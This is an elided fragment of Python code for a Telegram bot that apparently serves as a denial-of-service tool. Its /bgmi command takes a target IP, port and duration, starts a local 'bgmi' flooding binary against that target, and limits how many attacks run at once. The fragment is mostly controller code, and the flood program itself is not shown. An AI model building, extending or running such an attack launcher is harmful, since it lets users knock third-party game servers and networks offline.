...
def start(m):
    bot.reply_to(m, "Bot is Online! Use /bgmi IP PORT TIME")
...
def bgmi(m):
    ...
    try:
        ...
        bot.reply_to(m, f"Attack Started: {ip}:{port}")
        def run():
            global active_attacks
            subprocess.Popen(["./bgmi", ip, port, dur, "100"])
            time.sleep(int(dur))
            with attack_lock: active_attacks -= 1
...
gmi_command(message):
    ...
    if active_attacks >= MAX_ACTIVE_ATTACKS:
        bot.reply_to(message, "⏳ *Server Busy!*")
        return
